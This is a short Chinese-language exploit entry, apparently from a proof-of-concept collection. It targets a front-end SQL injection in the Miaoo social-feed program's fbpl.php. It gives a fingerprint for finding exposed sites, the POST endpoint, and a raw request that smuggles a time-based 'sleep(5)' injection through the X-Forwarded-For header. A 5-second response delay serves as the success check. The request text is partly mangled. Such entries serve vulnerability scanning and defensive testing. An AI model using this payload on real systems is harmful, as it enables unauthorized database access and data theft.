# Miaoo朋友圈程序存在前台fbpl.php存在SQL注入漏洞

- **系统**：Miaoo　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="./assets/img/thumbnail.svg"`
- **请求**：`POST /Miaoo/api/fbpl.php HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`

**请求体 / payload**
```
like Gecko) Chrome/122.0.0.0 Safari/537.36
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag
e/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: dark_theme=root; PHPSESSID=0ht8dht3gd8ooo5g6esuhervne; username=test123;
passid=5fwlo384oiz416wz9hioc31dupu7uxsd6ch1kf9me2kd4jzaif3ng9m41fi6yyqa
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
X-Forwarded-For: 192.168.1.1','1',sleep(5));#(
tieid=1&ztm=1&tiehf=1&tieea=1&pltext=1123
```
- **预期**：200　|　响应时间>=5s